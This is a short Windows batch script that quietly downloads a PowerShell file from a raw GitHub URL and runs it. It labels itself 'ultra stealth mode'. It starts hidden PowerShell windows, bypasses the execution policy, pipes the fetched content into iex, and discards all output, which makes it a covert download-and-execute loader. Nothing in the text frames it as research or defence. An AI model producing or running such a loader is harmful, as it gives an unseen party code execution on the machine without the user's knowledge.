@echo off
setlocal

:: === ULTRA STEALTH MODE - NO WINDOW EVER ===
set "url=https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/file.ps1"

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"iex (iwr ''%url%'' -UseBasicParsing).Content\"' -PassThru" >nul 2>&1

exit
